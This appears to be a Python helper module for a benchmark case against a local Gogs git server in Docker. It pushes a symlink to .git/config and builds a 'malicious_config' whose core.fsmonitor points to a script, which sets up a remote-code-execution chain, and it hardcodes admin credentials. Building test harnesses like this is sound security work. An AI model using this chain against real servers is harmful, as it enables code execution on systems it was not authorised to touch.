"""Gogs helpers for PCBV2-0121. Ports/container come from the platform env."""
import os
import re
import subprocess
import sys
import tempfile
import time

import requests

ADMIN_USER = "pcbadmin"
ADMIN_PASS = "Admin12345!"
ADMIN_EMAIL = "admin@pcb.local"
REPO_NAME = "testrepo"

PORTS = {"v0": 23400, "v1": 23401, "v2": 23402}


def _log(msg: str) -> None:
    if os.environ.get("PCB_DEBUG"):
        print(msg, file=sys.stderr)


def _port(version: str) -> int:
    pt = os.environ.get("PCB_TARGET_PORT")
    if pt:
        return int(pt)
    return int(PORTS.get(version, 23400))


def base_url(version: str) -> str:
    return f"http://127.0.0.1:{_port(version)}"


def container_id(version: str) -> str:
    cid = os.environ.get("PCB_CONTAINER_ID", "").strip()
    if cid:
        return cid
    project = os.environ.get("COMPOSE_PROJECT_NAME", "").strip()
    case_dir = os.environ.get("PCB_CASE_DIR", "").strip()
    if project:
        cmd = ["docker", "compose", "-p", project]
        if case_dir:
            cmd += ["--project-directory", case_dir]
        cmd += ["ps", "-q", version]
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
        cid = (r.stdout or "").strip().splitlines()
        if cid:
            return cid[0]
    return ""


def wait_ready(version: str, timeout: int = 180) -> bool:
    url = base_url(version)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{url}/", timeout=3)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def _extract_csrf(html: str) -> str:
    m = re.search(r'name="_csrf"\s+(?:content|value)="([^"]+)"', html)
    if m:
        return m.group(1)
    m = re.search(r'_csrf.*?value="([^"]+)"', html)
    if m:
        return m.group(1)
    return ""


def install_gogs(version: str) -> bool:
    url = base_url(version)
    try:
        r = requests.get(f"{url}/user/login", timeout=8, allow_redirects=False)
        if r.status_code == 200 and "user_name" in (r.text or ""):
            return True
    except Exception:
        pass
    data = {
        "db_type": "SQLite3",
        "db_path": "/data/gogs/gogs.db",
        "app_name": "Gogs",
        "repo_root_path": "/data/git/gogs-repositories",
        "run_user": "git",
        "domain": "localhost",
        "ssh_port": "22",
        "http_port": "3000",
        "app_url": "http://localhost:3000/",
        "log_root_path": "/data/gogs/log",
        "smtp_host": "",
        "admin_name": ADMIN_USER,
        "admin_passwd": ADMIN_PASS,
        "admin_confirm_passwd": ADMIN_PASS,
        "admin_email": ADMIN_EMAIL,
    }
    try:
        s = requests.Session()
        r = s.get(f"{url}/install", timeout=10, allow_redirects=False)
        if r.status_code in (301, 302, 303) and "/install" not in r.headers.get("Location", ""):
            return True
        csrf = _extract_csrf(r.text if r.status_code == 200 else "")
        if r.status_code == 200:
            if csrf:
                data["_csrf"] = csrf
            r = s.post(f"{url}/install", data=data, timeout=30, allow_redirects=False)
            return r.status_code in (200, 302, 303)
        return True
    except Exception as e:
        _log(f"  install error: {e}")
        return False


def create_token(version: str) -> str:
    url = base_url(version)
    last = None
    for i in range(8):
        try:
            r = requests.post(
                f"{url}/api/v1/users/{ADMIN_USER}/tokens",
                auth=(ADMIN_USER, ADMIN_PASS),
                json={"name": f"pcb_token_{int(time.time())}_{i}"},
                timeout=10,
            )
            if r.status_code == 201:
                return r.json()["sha1"]
            last = f"token http {r.status_code}"
        except Exception as e:
            last = str(e)
        time.sleep(2)
    raise RuntimeError(f"token creation failed: {last}")


def repo_exists(version: str, token: str) -> bool:
    url = base_url(version)
    try:
        r = requests.get(
            f"{url}/api/v1/repos/{ADMIN_USER}/{REPO_NAME}",
            headers={"Authorization": f"token {token}"},
            timeout=10,
        )
        return r.status_code == 200
    except Exception:
        return False


def create_repo(version: str, token: str) -> dict:
    url = base_url(version)
    if repo_exists(version, token):
        return {"name": REPO_NAME}
    r = requests.post(
        f"{url}/api/v1/user/repos",
        headers={"Authorization": f"token {token}"},
        json={"name": REPO_NAME, "auto_init": False},
        timeout=15,
    )
    if r.status_code not in (200, 201):
        if repo_exists(version, token):
            return {"name": REPO_NAME}
        r.raise_for_status()
    repo_info = r.json() if r.content else {"name": REPO_NAME}

    clone_url = (
        f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1:{_port(version)}"
        f"/{ADMIN_USER}/{REPO_NAME}.git"
    )
    with tempfile.TemporaryDirectory() as tmpdir:
        repo_dir = os.path.join(tmpdir, REPO_NAME)
        os.makedirs(repo_dir)
        env = {
            **os.environ,
            "GIT_TERMINAL_PROMPT": "0",
            "GIT_AUTHOR_NAME": "test",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "test",
            "GIT_COMMITTER_EMAIL": "t@t",
        }
        subprocess.run(["git", "init", repo_dir], capture_output=True, timeout=10)
        subprocess.run(
            ["git", "-C", repo_dir, "checkout", "-b", "master"],
            capture_output=True,
            timeout=10,
        )
        with open(os.path.join(repo_dir, "README.md"), "w") as f:
            f.write("# test repo\n")
        subprocess.run(["git", "-C", repo_dir, "add", "."], capture_output=True, timeout=10)
        subprocess.run(
            ["git", "-C", repo_dir, "commit", "-m", "init"],
            capture_output=True,
            timeout=10,
            env=env,
        )
        subprocess.run(
            ["git", "-C", repo_dir, "remote", "add", "origin", clone_url],
            capture_output=True,
            timeout=10,
        )
        r2 = subprocess.run(
            ["git", "-C", repo_dir, "push", "-u", "origin", "master"],
            capture_output=True,
            text=True,
            timeout=30,
            env=env,
        )
        if r2.returncode != 0:
            _log(f"  init push failed: {r2.stderr}")
    return repo_info


def _link_exists(version: str, token: str) -> bool:
    url = base_url(version)
    try:
        r = requests.get(
            f"{url}/api/v1/repos/{ADMIN_USER}/{REPO_NAME}/contents/link",
            headers={"Authorization": f"token {token}"},
            timeout=10,
        )
        return r.status_code == 200
    except Exception:
        return False


def push_symlink(version: str, token: str = "") -> bool:
    if token and _link_exists(version, token):
        return True
    clone_url = (
        f"http://{ADMIN_USER}:{ADMIN_PASS}@127.0.0.1:{_port(version)}"
        f"/{ADMIN_USER}/{REPO_NAME}.git"
    )
    with tempfile.TemporaryDirectory() as tmpdir:
        repo_dir = os.path.join(tmpdir, REPO_NAME)
        r = subprocess.run(
            ["git", "clone", clone_url, repo_dir],
            capture_output=True,
            text=True,
            timeout=30,
            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )
        if r.returncode != 0:
            _log(f"  clone failed: {r.stderr}")
            return False
        link_path = os.path.join(repo_dir, "link")
        if os.path.lexists(link_path):
            return True
        os.symlink(".git/config", link_path)
        subprocess.run(["git", "add", "link"], cwd=repo_dir, capture_output=True, timeout=10)
        subprocess.run(
            ["git", "commit", "-m", "add link"],
            cwd=repo_dir,
            capture_output=True,
            timeout=10,
            env={
                **os.environ,
                "GIT_AUTHOR_NAME": "test",
                "GIT_AUTHOR_EMAIL": "t@t",
                "GIT_COMMITTER_NAME": "test",
                "GIT_COMMITTER_EMAIL": "t@t",
            },
        )
        r = subprocess.run(
            ["git", "push", "origin", "master"],
            cwd=repo_dir,
            capture_output=True,
            text=True,
            timeout=30,
            env={**os.environ, "GIT_TERMINAL_PROMPT": "0"},
        )
        if r.returncode != 0:
            _log(f"  push failed: {r.stderr}")
            return False
    return True


def malicious_config() -> str:
    return (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tfsmonitor = /data/pcb/fsmon.sh\n"
        "[remote \"origin\"]\n"
        f"\turl = /data/git/gogs-repositories/{ADMIN_USER}/{REPO_NAME}.git\n"
        "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
        "[branch \"master\"]\n"
        "\tremote = origin\n"
        "\tmerge = refs/heads/master\n"
    )


def read_flag_result(version: str) -> str:
    cid = container_id(version)
    if not cid:
        return ""
    try:
        r = subprocess.run(
            ["docker", "exec", cid, "cat", "/tmp/pcb_result.txt"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        return r.stdout.strip()
    except Exception:
        return ""


def clear_flag_result(version: str) -> None:
    cid = container_id(version)
    if not cid:
        return
    subprocess.run(
        ["docker", "exec", cid, "rm", "-f", "/tmp/pcb_result.txt"],
        capture_output=True,
        timeout=10,
    )


def setup_version(version: str) -> str:
    _log(f"  [{version}] Waiting for Gogs to be ready...")
    if not wait_ready(version):
        raise RuntimeError(f"Gogs {version} did not start")
    last = None
    for attempt in range(5):
        try:
            _log(f"  [{version}] Installing (try {attempt+1})...")
            install_gogs(version)
            time.sleep(2)
            _log(f"  [{version}] Creating token...")
            token = create_token(version)
            _log(f"  [{version}] Creating repo...")
            create_repo(version, token)
            time.sleep(1)
            _log(f"  [{version}] Pushing symlink...")
            if not push_symlink(version, token):
                raise RuntimeError(f"Failed to push symlink for {version}")
            time.sleep(1)
            return token
        except Exception as e:
            last = e
            _log(f"  [{version}] setup retry: {e}")
            time.sleep(3)
            wait_ready(version, timeout=60)
    raise RuntimeError(f"Gogs {version} setup failed: {last}")
